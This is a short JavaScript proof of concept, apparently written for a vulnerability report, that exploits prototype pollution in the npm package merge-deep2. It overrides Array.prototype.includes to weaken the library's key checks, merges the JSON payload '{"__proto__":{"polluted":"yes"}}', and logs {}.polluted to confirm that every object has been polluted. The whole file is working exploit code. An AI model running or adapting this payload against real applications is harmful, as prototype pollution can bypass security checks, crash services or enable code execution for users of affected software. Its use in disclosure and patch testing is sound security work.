Array.prototype.includes = function (key) {
    if (key == '__proto__' || key == 'constructor' || key == 'prototype' || key == 'polluted') {
        return false;
    } else {
        return true;
    }
};
const mergeDeep2 = require('merge-deep2');
let obj = {};
let malicious_payload = '{"__proto__":{"polluted":"yes"}}';
console.log({}.polluted);
mergeDeep2({}, JSON.parse(malicious_payload), true);
console.log({}.polluted);